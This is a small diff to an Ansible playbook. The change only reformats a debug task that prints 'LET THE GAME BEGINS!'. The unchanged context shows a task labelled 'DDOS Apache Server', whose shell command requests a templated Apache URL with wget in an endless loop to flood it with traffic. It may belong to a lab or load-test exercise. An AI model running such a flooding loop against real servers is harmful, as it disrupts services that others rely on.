@@ -8,7 +8,8 @@
     verbosity: 2
 
 - name: Warning message
-  debug: LET THE GAME BEGINS!  
+  debug:
+    msg: LET THE GAME BEGINS!  
 
 - name: DDOS Apache Server
   shell: "while true; do wget -q -O- {{ apache_server_url.stdout}}; done"
